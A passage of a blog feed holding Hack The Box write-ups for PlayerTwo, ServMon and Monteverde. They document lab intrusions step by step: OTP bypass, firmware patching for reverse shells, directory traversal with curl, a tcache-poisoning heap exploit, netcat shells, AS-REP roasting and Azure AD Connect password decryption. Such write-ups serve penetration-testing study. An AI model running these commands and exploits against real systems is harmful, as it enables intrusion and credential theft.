passwords:\nusers:\nsnowscan\njkr\nmprox\n0xdf\npasswords:\ntR@dQnwnZEk95*6#\nze+EKe-SGF^5uZQX\nXHq7_WJTA?QD_?E2\nLp-+Q8umLW5*7qkc\n We try some combinations on the login page and find out that they all work like this:\nmprox:tR@dQnwnZEk95*6#\nsnowscan:ze+EKe-SGF^5uZQX\n0xdf:XHq7_WJTA?QD_?E2\njkr:Lp-+Q8umLW5*7qkc However, all of them require an OTP code after login:\nOTP code   The message says that we can either use the code sent to the user mobile phone, or use backup codes. We remember as well that we have access to the totp API and now that we are half-logged in, we can provide our session cookie:\n$ curl http://product.player2.htb/api/totp -H 'Cookie: PHPSESSID=p6ifon40fk49n0o81mccdgbckh'\n{\u0026quot;error\u0026quot;:\u0026quot;Cannot GET /\u0026quot;}\n$ curl -XPOST http://product.player2.htb/api/totp -H 'Cookie: PHPSESSID=p6ifon40fk49n0o81mccdgbckh'\n{\u0026quot;error\u0026quot;:\u0026quot;Invalid action\u0026quot;}\n We now have a new error message, we are missing some action variable. Let’s add it in JSON format:\n$ curl -XPOST http://product.player2.htb/api/totp -H 'Cookie: PHPSESSID=p6ifon40fk49n0o81mccdgbckh' -d '{\u0026quot;action\u0026quot;: \u0026quot;\u0026quot;}'\n{\u0026quot;error\u0026quot;:\u0026quot;Missing parameters\u0026quot;} I got stuck here again for a while, trying all sorts of action names and adding additional parameters that could make sense for our use case. Crawled the web for ideas on common TOTP variable names and tried to find what library could be used here. After countless tries, the solution was simpler than what I was trying so far. The login page was telling us that we could use backup codes…so:\n$ curl -XPOST http://product.player2.htb/api/totp -H 'Cookie: PHPSESSID=p6ifon40fk49n0o81mccdgbckh' -d '{\u0026quot;action\u0026quot;: \u0026quot;backup_codes\u0026quot;}'\n{\u0026quot;user\u0026quot;:\u0026quot;mprox\u0026quot;,\u0026quot;code\u0026quot;:\u0026quot;87685768223422\u0026quot;} Firmware Code Injection We finally have access to the product page. Protobs helps game developers to provide a better visual experience to users:\nProtobs product   At the bottom of the page, we get the following message with a link to Protobs documentation:\nGet an early access to Protobs\nPlease read our documentation here to understand and work with our new protocol Protobs.\nWe also coming up with a Responsible Vulnerable Disclosure Program in the future to understand more issues in our development cycle. Stay tuned for the updates.\n The documentation explains how the Protobs firmware is provisioned and digitally signed:\nprotobs.pdf — firmware signing   And the provisioning looks like:\nprotobs.pdf — firmware provisioning   At the bottom of the document, we get a link to download the firmware and a link for the dev teams to do sanity checks on the firmware:\nprotobs.pdf — firmware download and test   The testing page is supposed to test the firmware in a sandbox:\nhttp://product.player2.htb/protobs/   If we upload the downloaded archive containing the firmware, we get a few alert messages:\nVerifying signature of the firmware\nIt looks legit. Proceeding for provision test\nAll checks passed. Firmware is ready for deployment.\n Let’s analyze the firmware. The archive contains 3 files: Protobs.bin, info.txt and version. The 2 text files do not contain any useful information. The firmware .bin file contains, as per the documentation, the signature followed by the code:\nfirmware   We can remove the signature (probably a SHA512) to analyze the binary in Ghidra:\nremove signature   The code in Ghidra is pretty simple and seems just dummy code…not a real firmware. The main function calls wait_for_fkey and waits for the user input then calls print_asciiart to print the banner and … that’s it! The wait_for_fkey function calls system 3 times to set up the TTY:\nwait_for_fkey()   The system call right before the user input seems a good spot to patch. Maybe we can trig a reverse shell during the signature verification if we replace the system argument. To avoid breaking the binary and playing with the binary section size, we will keep the payload the same size as the original one: 28 characters. However, by changing the code, the signature will not match anymore! Let’s see what error message we get by replacing the command by a ping home. We can use an online hex editor for that and upload the signed .bin file. We search for the stty command and replace the whole string with our ping. We make sure to pad the command with spaces until we reach the 28 characters:\nbinary patching   We export the patched binary and compress it again before uploading it to the test page:\n$ COPYFILE_DISABLE=1 tar -czf fw.tar Protobs_patched.bin On macOS, the tar command may pollute the archive with hidden files ._* if a file contains extended attributes. This may make the server fail the check. To avoid that, we must set COPYFILE_DISABLE=1.  There is no signature error and we get our pings home! The signature verification must be broken. If we remove the signature from the binary file, the check fails. If we change a byte of the signature the check fails as well. This may indicate that the signature is calculated only on a portion of the binary.\nNow, how to get a reverse shell in less than 28 characters? Netcat is installed but does not support the -e and -c flags. We can do it in 2 phases:\n we upload a PHP reverse shell script. We will be using the one from Pentestmonkey that we configure with the IP and port of our Netcat listener:  upload PHP reverse shell   Here rs is the PHP script. We removed the extension to fit the space. It is not possible to write in the website folder so we write to /tmp. We start an HTTP listener and upload the archive.\nwe upload another firmware binary to fire the reverse shell:  fire the PHP script   We start a Netcat listener and upload the archive to get a shell as www-data:\nreverse shell   Local Reconnaissance \u0026amp; Enumeration We start by upgrading our shell to a full interactive TTY.\nBy looking at the running processes, we see that a weird process mosquitto is running:\n/usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf The configuration file does not leak much information:\n$ cat /etc/mosquitto/mosquitto.conf\n# Place your local configuration in /etc/mosquitto/conf.d/\n#\n# A full description of the configuration file is at\n# /usr/share/doc/mosquitto/examples/mosquitto.conf.example\npid_file /var/run/mosquitto.pid\npersistence true\npersistence_location /var/lib/mosquitto/\nlog_dest file /var/log/mosquitto/mosquitto.log\nbind_address 127.0.0.1\ninclude_dir /etc/mosquitto/conf.d\n By googling it, we get that Mosquitto is an open-source MQTT broker. The MQTT protocol is a lightweight messaging protocol widely used in the IoT world.\nThe version installed has some public vulnerabilities, but nothing that seems useful:\n$ mosquitto -h\nmosquitto version 1.4.15 (build date Tue, 18 Jun 2019 11:42:22 -0300) We can read the man page to get to know how to interact with the service. The default port is 1883 and it is listening locally.\nPrivilege Escalation User pivoting Let’s continue to dig into Mosquitto service. Maybe the service is broadcasting interesting information. MQTT works with a subscription system. We must subscribe to a topic to start receiving messages published to it. We can start by subscribing to the wildcard topic # with the mosquitto_sub command:\nmosquitto_sub -d -h localhost -t ‘#’   We get a few uninteresting messages every minute…must be triggered by a cronjob.\nThe MQTT protocol implements a $SYS topic that can be used to debug, troubleshoot and monitor the broker. Let’s subscribe to all its sub-topics with '$SYS/#'. After a few seconds we get the private-key used to sign the Protobs firmware in the topic $SYS/internal/firmware/signing:\nmosquitto_sub -d -h localhost -t ‘$SYS/#’   And it happens to be as well the SSH key of the user observer! We SSH in and get the user flag:\nobserver@player2:~$ cat user.txt\nCDE0************************1251 Root escalation We find another PDF in the user home folder Protobs-Release-Notes.pdf. It contains details on the release cycle_,_ threat model and the product roadmap.\nProtobs Threat Model   When searching for SUID binaries, we find the Protobs binary in /opt/Configuration_Utility/. This folder contains as well the libc.so.6 (v2.29) and ld-2.29.so libraries that are used by the binary:\nldd Protobs   As the owner of the binary is root, we may escalate privileges if we find a vulnerability to exploit. When we launch the binary we see that we can list/read/create/delete game configurations:\nProtobs   If we create a new configuration we have to provide the following information:\ncreate new configuration   The first thing that comes to mind is to enter very long strings for each input to try to make the app crash. But it does not happen. Let’s retrieve the binary and the libraries locally to analyze them.\nThe file command shows that it is a 64-bit binary that is stripped.\nWe will be using both static analysis with Ghidra and dynamic analysis on an Ubuntu 18.04.3 LTS box with pwndbg.\nStatic Analysis We load the binary in Ghidra and even if there are no symbols, we can easily find the main function and start from there.\nI have renamed the functions’ name and some variables for a better readability.  The main config is not really interesting. It outputs some text, the banner then calls the function that shows the menu:\ndecompiled main function   Most of the interesting code is in the function that creates a configuration. It first checks if we have still space for a new config. Only 14 are allowed. Then it allocates a 56 bytes buffer on the heap to store the configuration and asks for the config name that can be max 20 characters long:\ndecompiled createConfig function — part 1   The second part retrieves the rest of the configuration. We have the choice to add a description by setting its size to a number greater than 0. When we do that, another buffer is allocated on the heap and its address is stored in the configuration. In copying the description to the heap, we see that the NULL byte is set in a wrong way, it overflows the buffer and may overwrite the next buffer:\ndecompiled createConfig function — part 2   The configuration in the heap looks like:\n[Name (20B) | Contrast (4B) | Gamma (4B) | ResX (4B) | ResY (4B) | Controller (4B) | SizeDesc (4B) | 4 empty bytes | Pointer to desc buffer (8B)] Now let’s have a look at the configuration delete function. We are asked to choose the configuration index to delete and if the index exists, it:\n deallocates the description buffer, if any, deallocates the configuration buffer, zeroes the pointer to the config in the global CONFIG array.  decompiled deleteConfig function   There may be another issue here. As the configuration buffers are always of the same size (56B), they are re-used. For instance, if we create a configuration, delete it, and re-create it, it will be stored at the same address. The following scenario may lead to a memory double free issue:\n create a configuration A with a description, delete this configuration A, create a configuration B without description. delete this configuration B.  Knowing that the free function does not zero the buffers (however, this depends on the implementation), we end up with a configuration B that contains a pointer to the description of A which will be deallocated a second time leading to a double free that leads to memory corruption and in some cases to code execution. Let’s test it:\ndouble free   We see that we were right but our double free was detected and the program aborted. This is due to some new mitigations of the Libc introduced in v2.28. We are done with the static analysis.\nDynamic Analysis So what we know so far:\n this is clearly a heap exploitation, we have a double free issue and a NULL byte overflow at our disposal, we have a 64-bit binary that uses Libc v2.29 which adds more heap safeguards.  Let’s disable ASLR to ease the debugging process:\n$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space Then we quickly check the binary protections:\nchecksec ./Protobs   There is no PIE enabled and we can create the /opt/Configuration_Utility and copy the binary and the libraries. Full RELRO is enabled which means that we will not be able to overwrite the GOT.\nI won’t go into the theory of heap exploitation or heap management, bins, chunks, tcache or the exploitation mitigations of the last Libc versions…because others did it way better than what I could do. You will find in [13] the articles and write-ups I used to exploit this binary. This article was particularly clear and helped me a lot on this topic.  The main idea here is:\n the first part is to leak a Libc address. This can be achieved by freeing a chunk in the unsorted bin. The first chunk of the unsorted bin list gets a pointer to the main_arena in its forward and backward pointers (the unsorted bin is a double-linked list). The main_arena is in the Libc. We can probably use the double-free issue to read it. for the second part, as we cannot overwrite the GOT, we can hijack a method like __malloc_hook or __free_hook so that the next time we call malloc or free, respectively, it spawns a shell. We will dig into tcache poisoning by exploiting the double free and the NULL byte overflow to bypass the tcache mitigations.  We first create our exploit skeleton with the necessary helper functions to interact with the binary:\n A quick debugging shows that the first configuration heap address is always 0x604260 with ASLR disabled. So we can call the debug() function at any time to see the heap status.\nLet’s see how the heap behaves. We create 2 configs A and B both with a description:\ncreate_config('A'*4, desc='A'*0x5, size=0x5)\ncreate_config('B'*4, desc='B'*0x5, size=0x5) The heap looks like this:\nheap status 1   Now if we delete the configurations, we have this status:\ndelete_config(0)\ndelete_config(1) heap status 2   We clearly see that some data is still present and particularly the pointers to the descriptions (in red). If we now create a new configuration without description, it will replace one of the freed chunk as the chunk size is still the same:\ncreate_config('C'*4, 0) heap status 3   The config C took the place of the config B and kept the pointer to the config B description 0x604300 which points to a heap address 0x6042a0 as it has been freed. So if we read the config C (index 0) we leak the heap address:\nres = read_config(0)\nprint(res) heap address leak   Ok, we can leak a heap address, good, but this is not what we want. We want a Libc address. As we are using a Libc 2.29, the freed chunks went to the tcache bin (added in Libc 2.26) as the description sizes were smaller than 0x408 bytes. If we use bigger sizes they will go in the unsorted bins and leak a Libc address instead. Let’s redo the process with a size 0x500:\ncreate_config('A'*4, desc='A'*0x500, size=0x500)\ncreate_config('B'*4, desc='B'*0x500, size=0x500)\ndelete_config(0)\ndelete_config(1)\ncreate_config('C'*4, 0)\nres = read_config(0)\nprint(res) leak fail   It’s a fail. The config C description points to the real config B description. If we have a look at the heap:\nheap status 4   The config C took the place of the config B as expected, however, the freed config A took the main_arena address:\nheap status 5   So we need the config C to take the place of the config A and not B. We just have to free first the config B and then the config A as it works as First-In-Last-Out (FILO). Once we do that, we get what we want:\nlibc address leak   Now that we have the address 0x7ffff7fc5ca0, we calculate the offset with the Libc base address that we can get on pwngdb with the vmmap command:\nvmmap   The offset is therefore 0x7ffff7fc5ca0 — 0x7ffff7de1000 = 0x1e4ca0. This offset is constant for a given Libc version so we can use it on the remote server to get its Libc base address. The code for this part:\n Now that we have the Libc base address we can get the addresses of system and __free_hook that we will be using in the second part:\nsystem = libc.sym['system']\nfree_hook = libc.sym['__free_hook'] Then, as we messed up quite a bit with the heap, we reallocate the freed chunks by adding 2 new configs of the same size and start fresh from there:\ncreate_config('X'*4, desc='X'*0x500, size=0x500)\ncreate_config('X'*4, desc='X'*0x500, size=0x500) After that, we have 3 existing configurations that we won’t alter anymore.\nSince Libc 2.28, a tcache double-free mitigation was added. Now in order to double-free, we need a way to change a chunk size, so when we free it, it goes in a different tcache bin. We will be using the NULL byte overflow to rewrite the next chunk size. This is similar to the technique used in this write-up.\nIn order to exploit the NULL byte overflow, we need the descriptions to be adjacent in the heap. As we saw initially, this is not the case. After a few tries I came up with the following course of actions:\ncreate_config('D'*4, 0)\ncreate_config('E'*4, 0)\ndelete_config(3)\ncreate_config('F'*4, desc='F'*0x78, size=0x78)\ndelete_config(4 )\ncreate_config('G'*4, desc='G'*0x180, size=0x180) We first create 2 configurations D and E without description that will be adjacent. We delete D and create F. The config F will take the place of config D and desc F will be placed right after config E. Finally, we delete E and create G. The config G will take the place of config E and the desc G will be placed after desc F. In this disposition, we are ready for the overflow:\nheap status 6   Moreover, they are created with different description sizes. The first chunk may be anything, we choose 0x78 so it differs from the configuration chunk one (0x58) and will, therefore, use a different tcache bin when freed. The second chunk must be higher than 0x100 so it can become 0x100 once overwritten by the NULL byte. Then in order:\n we delete config G (index 4) then config F (index 3). The desc G chunk will go in the 0x70 tcache bin and the desc F chunk will go in the 0x180 tcache bin:  delete_config(4)\ndelete_config(3) we create config H (index 3) with a description of 0x78 bytes. It will take the place of the chunk F and the 0x79th bytes (0x00) will overflow the size of the chunk G description. We prepare as well the argument for the system call as the name of the configuration:  create_config('/bin/sh', desc='H'*0x78, size=0x78) heap status 7   now that we have changed the desc G chunk size, we can free it again. For that, we have to create a new config I (index 4) without description. It will take the place of config G and desc I will point to desc G (the one with size 0x100). We can then immediately free it. The desc I/G chunk will go in the 0xf0 tcache bin:  create_config('I'*4, 0)\ndelete_config(4) we restore the freed 0x180 chunk. It will take the place of the config I (index 4) but the desc chunk size will remain 0x100:  create_config('J'*4, desc='J'*0x180, size=0x180) heap status 8   free it again right away. This will place the chunk again in the 0xf0 tcache bin. As it is the same chunk as before, we have 2 same chunks in the same tcache bin, like a double free :)  delete_config(4) heap status 9   We see that as we have 2 same chunks in the bin, the second chunk fd pointer, points to itself. This leads to an arbitrary read/write primitive.\nwith the above, we can now perform a tcache poisoning attack to allocate a chunk on __free_hook and overwrite it with the address of system. So we start by re-allocating a 0xf0 tcache bin chunk and change its fd address to the address of __free_hook:  create_config('K'*4, desc=p64(free_hook)+'K'*0xe8, size=0xf0) heap status 10   we re-allocate the same chunk again:  create_config('L'*4, desc='L'*0xf0, size=0xf0) heap status 11   we allocate a description chunk on __free_hook and make it point to system:  create_config('M'*4, desc=p64(system)+'M'*0xe8, size=0xf0) heap status 12   Finally, the last step is to call free the config H (index 3), the one containing our payload /bin/sh. This will call __free_hook that points to system with, as argument, the pointer to /bin/sh!  delete_config(3) To exploit the binary on the server, we can expose it as a remote service with the following command. It will run on port 4444:\n$ mkfifo /tmp/p;nc -lp 4444 \u0026lt; /tmp/p | /opt/Configuration_Utility/Protobs \u0026gt; /tmp/p \u0026amp; And here is the full exploit code:\n We can launch our exploit now and get the root flag:\nexploit and root flag   Conclusion As I already said in my Rope write-up, this box was amazing and in my top 3 preferred boxes so far! Those boxes that push you to “go back to school” and learn new things on the fly are what make Hack The Box so enjoyable.\nI am not an expert in heap exploitation and to be honest, this was the first time for me. There are certainly many other ways to exploit it, maybe more straightforward, like not using tcache at all. I am looking forward to reading other write-ups to better understand what else is feasible as I haven't grasped all the subtleties of heap exploitation yet. Great job from the 2 creators!\nResources [1] Twirp\nhttps://github.com/twitchtv/twirp\nhttps://twitchtv.github.io/twirp/docs/intro.html\n[2] Protobuf\nhttps://developers.google.com/protocol-buffers/\n[3] TwirPHP\nhttps://github.com/twirphp/twirp\nhttps://twirphp.readthedocs.io/en/latest/getting-started/installation.html\nhttps://twirphp.readthedocs.io/en/latest/getting-started/best-practices.html\n[4] Hexed\nhttps://hexed.it/\n[5] PHP Reverse Shell\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\n[6] Upgrading from netcat with magic\nhttps://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic\n[7] Mosquitto\nhttps://mosquitto.org/\n[8] Mosquitto 1.4.15 public vulnerabilities\nhttps://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-45945/version_id-248536/Eclipse-Mosquitto-1.4.15.html\n[9] MQTT SYS topic\nhttps://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics\n[10] Ghidra\nhttps://ghidra-sre.org/\n[11] pwndbg\nhttps://github.com/pwndbg/pwndbg\n[12] Double freeing memory\nhttps://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory\n[13] Heap Exploitation\nhttps://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/\nhttps://sensepost.com/blog/2017/linux-heap-exploitation-intro-series-riding-free-on-the-heap-double-free-attacks/\nhttps://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\nhttps://faraz.faith/2019-10-24-hitconctf-lazyhouse-balsn-exploit-analysis/\nhttps://cr0wn.uk/2019/defcon-babyheap/\n","description":"OS: Linux | Level: Insane | Creators: MrR3boot \u0026 b14ckh34rt | Released: December 14th, 2019 | Retired: June 27th, 2020 | Difficulty: 7.7/10 | Appreciation: 4.4/5","id":3,"section":"posts","tags":["triwp","protobuf","totp","firmware_injection","mqtt","mosquitto","heap","pwn","tcache_poisoning","libc2.29","double_free","null_byte_overflow"],"title":"Hack The Box :: PlayerTwo","uri":"https://noobintheshell.com/posts/htb_playertwo/"},{"content":"  ServMon is an Easy Windows box created by dmw0ng. It was released on April 11th, 2020 and retired on June 20th, 2020. The users rated the difficulty 4.1/10 and gave an appreciation score of 2.1/5.\nServMon Info Card   TL;DR We access an FTP server anonymously to retrieve some information about a password file in nathan home directory. A directory traversal/arbitrary file read vulnerability on a NVMS-1000 instance allows us to read this file and get nadine password. We can log in through SSH to retrieve the user flag. Another website exposes an NSClient++ instance. We can read the admin password from its configuration file. We then exploit a known authenticated privilege escalation vulnerability to get the root flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -p- 10.10.10.184\n   PORT STATE  SERVICE VERSION     21/tcp open ftp Microsoft ftpd   22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)   80/tcp open http    135/tcp open msrpc Microsoft Windows RPC   139/tcp open netbios-ssn Microsoft Windows netbios-ssn   445/tcp  open microsoft-ds?     5040/tcp open unknown    5666/tcp open nrpe?    6063/tcp open x11?    6699/tcp open napster?    7680/tcp open pando-pub?    8443/tcp open tcpwrapped      We discover:\n a Microsoft FTP server, 2 websites on port 80 and 8443, the SMB/RPC and other weird Microsoft ports opened.  Web discovery — 80 We access the login page of a network surveillance management software called NVMS-1000:\nwebsite landing page   There is a known Directory Traversal vulnerability on this product. However, we do not know the version(s) impacted.\nA Nikto and a folder/file discovery scan do not show much information.\nWeb discovery — 8443 Here we have access to a NSClient++ web application:\nwebsite landing page   This is a monitoring tool originally created to work with Nagios. The version 0.5.2.35 has a known authenticated privilege escalation vulnerability.\nNote: if you can’t access it on Chrome due to a certificate error, you can launch Chrome with the --ignore-certicate-errors flag.  FTP Anonymous login is enabled and we can access a Users folder that contains the folders Nadine and Nathan. The Confidential.txt file in Nadine folder contains the following message:\nNathan,\nI left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder.\nRegards\nNadine And the Notes to do.txt in Nathan folder shows:\n Change the password for NVMS - Complete Lock down the NSClient Access - Complete Upload the passwords Remove public access to NVMS Place the secret files in SharePoint   SMB SMB requires authentication and we don’t have any credentials at this point.## [2] Gaining Access\nWe know that there may be a Password.txt file in nathan desktop folder. We can try to exploit the directory traversal/arbitrary file read vulnerability to read it. Using the payload of the documented exploit does not work:\n$ curl http://10.10.10.184/../../../../../../../../windows/win.ini With some encoding, however:\n$ curl http://10.10.10.184/..%2F..%2F..%2Fwindows/win.ini\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1 Next, we get the password file…as we know the path:\n$ curl \u0026quot;http://10.10.10.184/..%2F..%2F..%2Fusers/nathan/desktop/passwords.txt\u0026quot;\n1nsp3ctTh3Way2Mars!\nTh3r34r3To0M4nyTrait0r5!\nB3WithM30r4ga1n5tMe\nL1k3B1gBut7s@W0rk\n0nly7h3y0unGWi11F0l10w\nIfH3s4b0Utg0t0H1sH0me\nGr4etN3w5w17hMySk1Pa5$ We can store those passwords and test them with the 2 users we know:\ncrackmapexec smb 10.10.10.184 -u nathan nadine -p pass.txt   We get nadine password that we can use to log in through SSH and to get the user flag:\nuser flag   Local Reconnaissance \u0026amp; Enumeration According to the NSClient++ exploit description, there are 2 ways to retrieve the password:\n  from its configuration file:\nnadine@SERVMON c:\\Program Files\\NSClient++\u0026gt;type nsclient.ini\n[\u0026hellip;]\n; Undocumented key\npassword = ew2x6SsGTxjRwXOT\n; Undocumented key\nallowed hosts = 127.0.0.1\n[\u0026hellip;]\n  by using the client binary nscp.exe:\nnadine@SERVMON c:\\Program Files\\NSClient++\u0026gt;nscp.exe web \u0026ndash; password \u0026ndash;display\nCurrent password: ew2x6SsGTxjRwXOT\n  But when we use it, we are still not allowed. This is probably due to the allowed hosts config that is set to accept only access from 127.0.0.1.\nPrivilege Escalation Let’s try through an SSH tunnel which would make us browse it from the localhost:\n$ ssh -L 8443:localhost:8443 nadine@10.10.10.184 Then we browse https://localhost:8843…but we can’t reach it. By pinging localhost on the box, we see that it resolves to IPv6 localhost ::1. We retry with:\n$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 This time we access the website and we can log in…but the whole page is damn slow:\nNSClient\u0026#43;\u0026#43; dashboard   We can now try to exploit the known privilege escalation vulnerability. The exploit requires to enable 2 modules: CheckExternalScripts and Scheduler. We can check that they are already enabled. Then we can follow these steps:\n copy Netcat on the server and start a listener locally:  $ scp /tools/win/nc64.exe nadine@10.10.10.184:/temp\n$ nc -lnvp 1234 modify the settings of the CheckExternalScripts module to run a Netcat reverse shell:  modify CheckExternalScripts configuration   reload the module and wait for it:  reload module CheckExternalScripts   Click once to unload it and once more to re-load it and trigger the reverse shell:\nroot flag   I spent quite some time trying to reproduce the exploit steps without success. In the end, there seems to be multiple other ways to get the reverse shell but this was the easiest I could find.  Conclusion An easy box exploiting some basic public vulnerabilities. The only difficulty was the stability of the box when many users were trying to exploit it all at once. I think the bad score of this box was mainly due to that.\nAs usual, here are some takeaways:\n update your software, run them with dedicated service accounts and don’t expose them publicly if this is not needed, disable anonymous FTP login, even better…stop using FTP once and for all! Switch to FTPS, SFTP, or possibly to a solution with 2FA.  Resources [1] NVMS-1000 Network Surveillance Management Software\nhttp://en.tvt.net.cn/products/188.html\n[2] NVMS-1000 Directory Traversal\nhttps://www.exploit-db.com/exploits/47774\n[3] NSClient++\nhttps://nsclient.org/\n[4] NSClient++ authenticated privilege escalation vulnerability\nhttps://www.exploit-db.com/exploits/46802\n","description":"OS: Windows | Level: Easy | Creators: dmw0ng | Released: April 11th, 2020 | Retired: June 20th, 2020 | Difficulty: 4.1/10 | Appreciation: 2.1/5","id":4,"section":"posts","tags":["arbitrary_file_read","nvms-1000","nsclient++"],"title":"Hack The Box :: ServMon","uri":"https://noobintheshell.com/posts/htb_servmon/"},{"content":"  Monteverde is a Medium Windows box created by egre55. It was released on January 11th, 2020 and retired on June 13th, 2020. The users rated the difficulty 4.8/10 and gave an appreciation score of 4.3/5.\nMonteverde Info Card   TL;DR We can anonymously bind to an Active Directory to retrieve the list of users and service accounts. The service account SABatchJobs password is the same as the username. With this account, we access a share that contains mhope password in clear-text. We log in through WinRM and retrieve the user flag. As mhope is part of the Azure Admins groups and that Azure AD Connect is installed and configured, we can use a known set of Powershell commands to extract its configuration from the MS SQL database and decrypt the password of the service account, which is…the domain admin. We can then use psexec to get a SYSTEM shell and the root flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -p- 10.10.10.172\n   PORT STATE  SERVICE VERSION     53/tcp open domain?    88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-02-02 07:47:32Z)   135/tcp open msrpc Microsoft Windows RPC   139/tcp open netbios-ssn  Microsoft Windows netbios-ssn   389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)   445/tcp open microsoft-ds?    464/tcp open kpasswd5?    593/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1.0   636/tcp open tcpwrapped    3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)   3269/tcp open tcpwrapped    5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)   9389/tcp  open mc-nmf .NET Message Framing     We discover:\n the usual ports opened in a Windows Domain Controller and __ the domain is MEGABANK.LOCAL, the WinRM management service over HTTP on port 5985.  LDAP Anonymous binding is enabled and we can browse the Active Directory with tools like Jxplorer by configuring it as follows:\nJxplorer AD config   We get the following information:\n the Domain Controler monteverde.megabank.local is a Windows Server 2019 Standard, the user accounts:     username memberOf     dgalanos Trading   mhope Azure Admins, Remote Management Users   smorgan Operations   roleary HelpDesk     the service accounts:     username memberOf     SABatchJobs none   svc-ata none   svc-bexec none   svc-netapp none     there is an additional user AAD_987d7f2f57d2 that is member of Azure Admins. Sounds like an account used for Azure AD. Its description is:  Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. SMB SMB requires authentication and we do not have any credentials at the moment.\nGaining Access With what we discovered so far, let’s store the list of user accounts in a file users.txt and check if a user has a weak password by using a small wordlist:\n$ crackmapexec smb 10.10.10.175 -u users.txt -p pass_small.txt Nothing shows up. The next thing we can try is AS-REP Roasting. This attack is explained in detail in this blog post. To make it short, if a user is configured to not require Kerberos pre-authentication, anyone can send a request (AS_REQ) to the KDC and receive a response (AS_REP). The response contains an encrypted chunk of data related to that user that can be cracked offline to retrieve the user password. This can be automatized with tools like Impacket GetNPUsers.py:\nGetNPUsers.py -dc-ip 10.10.10.172 megabank.local/ -usersfile users.txt -format john   Same result. Trying with a medium password list is still unsuccessful. Then we tried with blank passwords and the username as password and found the following default credentials: SABatchJobs:SABatchJobs. With that, we can list the available shares:\ncrackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs --shares   The azure_uploads share is empty but the users$ one contains some user folders. However, only one folder is not empty:\nusers$\n\u0026ndash; dgalanos\n\u0026ndash; mhope\n\u0026ndash; azure.xml\n\u0026ndash; roleary\n\u0026ndash; smorgan The azure.xml file looks like a configuration file to create a password-based Azure Service Principal and contains a plain-text password:\nazure.xml   It happens to be mhope password who is member of the Remote Management Users. We can, therefore, log in through WinRM with evil-winrm and get the user flag:\nevil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$   Local Reconnaissance \u0026amp; Enumeration We find a .Azure folder in the user home folder that contains cached Azure tokens inTokenCache.dat:\nC:\\Users\\mhope\\.Azure   They are not valid anymore but we can retrieve some information from its content. Were they still valid, we could have possibly replayed them to connect to the Azure tenant. The cache contains 2 pairs of token to access Microsoft Graph API https://graph.windows.net and to access the Azure Resource Manager provider https://management.core.windows.net. The token pair consists of an Access Token and an ID token in the JWT format. This is the result of an OpenID Connect authentication:\nMicrosoft Graph API tokens   From this we get as well the user ID john@67632354763outlook.onmicrosoft.com and the tenant ID: 372efea9-7bc4-4b76-8839-984b45edfb98. We do not need to dig further into this for the moment.\nIf we have a look at the installed applications we see some applications related to Azure AD like Azure AD Connect, Azure AD Sync and MS SQL Server used by Azure AD Connect to store metadata and configuration data for the Azure AD Sync service. Azure AD Connect is used to synchronize on-premise AD objects with Azure AD in a hybrid cloud model.\nPrivilege Escalation If we search for known attacks on Azure AD Connect, we come across this article that explains how to retrieve the configuration of Azure AD Sync and how to decrypt the password of the service account used to perform such synchs. In the article, the configuration is stored in an MS SQL Express LocalDB database_._ As explained, the configuration is in clear-text, except for the user password that is stored in an encrypted field. Fortunately mhope is member of the Azure Admins group. Let’s use the given commands:\n Connect to the database:  There is no MS SQL Express LocalDB instance on the box. The configuration is stored in a standard MS SQL instance. We need therefore to change the connection string as follows:\n Retrieve the necessary keying material stored in the database to decrypt the password:   Retrieve the clear-text and the encrypted configuration:   We can print the configuration at this point:\nADSync configuration   We can see that the domain administrator account is used for the synch and that its password is encrypted.\nDecrypt the user password and print data:   The output of this is:\nDomain: MEGABANK.LOCAL\nUsername: administrator\nPassword: d0m@in4dminyeah! We can now get a SYSTEM shell with psexec:\npsexec.py administrator@10.10.10.172   Conclusion The first part, until the user shell, was quite easy. I really enjoyed the second part that was completely new to me. There should definitely be more boxes related to Azure, AWS and GCP!\nAs usual, here are some takeaways:\n disable Active Directory anonymous binding, change default passwords, don’t re-use then and enforce a strong password policy, update Azure AD Connect as soon as patches are available and use a dedicated service account with the least privileges possible.  Resources [1] Jxplorer\nhttp://jxplorer.org/\n[2] AS-REP Roasting\nhttps://www.harmj0y.net/blog/activedirectory/roasting-as-reps/\n[3] Create an Azure Service Principal\nhttps://docs.microsoft.com/bs-cyrl-ba/powershell/azure/create-azure-service-principal-azureps?view=azps-4.2.0\u0026amp;viewFallbackFrom=azps-2.5.0\n[4] Microsoft Graph\nhttps://docs.microsoft.com/en-us/graph/overview\n[5] Azure Resource Manager\nhttps://docs.microsoft.com/en-us/azure/azure-resource-manager/management/overview\n[6] OpenID Connect\nhttps://openid.net/connect/\n[7] Azure AD Connect\nhttps://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect\n[8] Azure AD Connect for Red Teamers\nhttps://blog.xpnsec.com/azuread-connect-for-redteam/\n","description":"OS: Windows | 